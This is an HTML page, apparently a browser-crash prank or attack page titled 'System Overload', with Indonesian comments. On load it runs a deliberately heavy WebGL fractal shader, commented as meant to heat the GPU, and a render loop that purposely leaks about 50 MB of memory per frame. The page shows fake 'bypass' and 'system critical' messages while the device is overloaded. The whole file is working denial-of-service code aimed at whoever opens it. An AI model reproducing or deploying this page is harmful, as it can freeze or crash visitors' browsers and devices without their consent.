<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System Overload - CZ-Hybrid</title>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; }
        canvas { width: 100vw; height: 100vh; display: block; }
        #status {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: #0f0; font-family: monospace; z-index: 10; pointer-events: none;
        }
    </style>
</head>
<body>
    <div id="status">INITIATING CZ-NULL BYPASS...</div>
    <canvas id="c"></canvas>

    <script id="vs" type="x-shader/x-vertex">
        attribute vec3 position;
        void main() { gl_Position = vec4(position, 1.0); }
    </script>

    <script id="fs" type="x-shader/x-fragment">
        precision highp float;
        uniform float time;
        uniform vec2 res;

        // Teknik cznull: Fraktal berat yang dipaksa render per pixel
        float kernal(vec3 ver){
            vec3 a = ver;
            float b;
            for(int i=0; i<12; i++){ // Ditingkatkan ke 12 loop buat bikin GPU panas
                b = length(a);
                float c = atan(a.y, a.x) * 10.0;
                float d = acos(a.z / b) * 10.0;
                b = pow(b, 8.0);
                a = vec3(b * sin(d) * cos(c), b * sin(d) * sin(c), b * cos(d)) + ver;
                if(b > 8.0) break;
            }
            return 5.0 - length(a);
        }

        void main() {
            vec2 uv = (gl_FragCoord.xy * 2.0 - res) / min(res.x, res.y);
            vec3 color = vec3(0.0);
            // Ray marching intensif
            for(int i=0; i<60; i++) {
                vec3 p = vec3(uv, time * 0.1) + float(i) * 0.05;
                if(kernal(p) < 0.1) {
                    color += vec3(0.1, 0.0, 0.0) * float(i);
                }
            }
            gl_FragColor = vec4(color, 1.0);
        }
    </script>

    <script>
        const canvas = document.getElementById('c');
        const gl = canvas.getContext('webgl');
        
        // Setup Buffer & Shaders (Logic Gabungan)
        function createShader(gl, type, source) {
            const s = gl.createShader(type);
            gl.shaderSource(s, source);
            gl.compileShader(s);
            return s;
        }

        const program = gl.createProgram();
        gl.attachShader(program, createShader(gl, gl.VERTEX_SHADER, document.getElementById('vs').text));
        gl.attachShader(program, createShader(gl, gl.FRAGMENT_SHADER, document.getElementById('fs').text));
        gl.linkProgram(program);
        gl.useProgram(program);

        const posLoc = gl.getAttribLocation(program, "position");
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,0, 1,-1,0, -1,1,0, -1,1,0, 1,-1,0, 1,1,0]), gl.STATIC_DRAW);
        gl.enableVertexAttribArray(posLoc);
        gl.vertexAttribPointer(posLoc, 3, gl.FLOAT, false, 0, 0);

        const timeLoc = gl.getUniformLocation(program, "time");
        const resLoc = gl.getUniformLocation(program, "res");

        // MEMORY LEAK EXTRA (Vault Mode)
        const junk = [];
        
        function render(t) {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            gl.viewport(0, 0, canvas.width, canvas.height);
            
            gl.uniform1f(timeLoc, t * 0.001);
            gl.uniform2f(resLoc, canvas.width, canvas.height);
            gl.drawArrays(gl.TRIANGLES, 0, 6);
            
            // Tambahan beban RAM setiap frame
            for(let i=0; i<50; i++) {
                junk.push(new Uint8Array(1024 * 1024)); // Makan 1MB tiap loop
            }

            requestAnimationFrame(render);
        }
        
        setTimeout(() => {
            document.getElementById('status').innerText = "SYSTEM CRITICAL - OVERDRIVE";
            render();
        }, 1000);
    </script>
</body>
</html>
